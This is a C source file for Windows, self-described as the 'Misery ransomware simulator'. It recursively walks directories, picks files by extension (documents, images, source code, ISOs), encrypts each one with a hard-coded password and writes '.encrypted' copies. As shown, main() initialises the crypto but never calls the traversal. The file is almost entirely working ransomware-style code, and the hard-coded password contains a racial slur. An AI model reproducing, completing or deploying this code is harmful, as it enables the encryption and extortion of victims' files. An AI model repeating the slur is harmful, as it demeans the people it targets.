//misery.c//

#include "crypto.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <windows.h>
#include <stdbool.h>

const char *EXTS[] = {".txt",".jpg",".c",".h",".md",".iso",".png",0};

bool is_target(const char *filename) {
    const char *dot = strrchr(filename, '.');
    if (!dot) return false;
    for (int i = 0; EXTS[i]; ++i) if (_stricmp(dot, EXTS[i]) == 0) return true;
    return false;
}

bool MiseryEncryptFile(const char *path, CRYPTO_CTX *ctx) {
    FILE *in = fopen(path, "rb");
    if (!in) { printf("[!] Open fail: %s\n", path); return false; }
    fseek(in, 0, SEEK_END); long sz = ftell(in); rewind(in);
    if (sz <= 0 || sz > MAX_BUFFER_SIZE) { printf("[!] Invalid size: %s\n", path); fclose(in); return false; }
    BYTE *plain = malloc(sz); if (!plain) { fclose(in); return false; }
    if (fread(plain, 1, sz, in) != sz) { printf("[!] Read fail: %s\n", path); free(plain); fclose(in); return false; }
    fclose(in);

    DWORD outcap = CRYPTO_REQUIRED_CAPACITY(sz); BYTE *cipher = malloc(outcap); DWORD outlen = 0;
    if (!cipher) { free(plain); return false; }
    CRYPTO_ERROR cerr = EncryptBuffer(ctx, plain, sz, cipher, &outlen, outcap);

    if (cerr != CRYPTO_SUCCESS) {
        printf("[!] EncryptBuffer failed: %s: %s\n", path, GetErrorString(cerr));
        free(plain); free(cipher); return false;
    }
    char outpath[4096]; snprintf(outpath, sizeof(outpath), "%s.encrypted", path);
    FILE *out = fopen(outpath, "wb");
    if (!out || fwrite(cipher, 1, outlen, out)!=outlen) {
        printf("[!] Write fail: %s\n", outpath);
        if (out) fclose(out);
        free(plain); free(cipher); return false;
    }
    fclose(out);
    printf("[+] Encrypted: %s (%ld bytes)\n", outpath, sz);
    free(plain); free(cipher); return true;
}

void TraverseAndEncrypt(const char *dir, CRYPTO_CTX *ctx) {
    char pattern[4096];
    struct _finddata_t c_file;
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    intptr_t hFile = _findfirst(pattern, &c_file);
    if (hFile == -1L) return;
    do {
        if (strcmp(c_file.name, ".") == 0 || strcmp(c_file.name, "..") == 0) continue;
        char path[4096]; snprintf(path, sizeof(path), "%s\\%s", dir, c_file.name);
        if (c_file.attrib & _A_SUBDIR) TraverseAndEncrypt(path, ctx);
        else if (is_target(path)) MiseryEncryptFile(path, ctx);
    } while (_findnext(hFile, &c_file) == 0);
    _findclose(hFile);
}

int main() {
    puts("========== MISERY RANSOMWARE SIMULATOR (single-threaded, improved) ==========");
    const char *pw = "Ibethatprettyniggaman@1318";
    CRYPTO_ERROR cerr = InitCrypto(pw, strlen(pw));
    if (cerr != CRYPTO_SUCCESS) {
        printf("[!] Crypto init failed: %s\n", GetErrorString(cerr)); return 1;
    }
    CRYPTO_CTX *ctx = GetCryptoCtx();


    CleanupCrypto();
    puts("[+] Done");
    return 0;
}
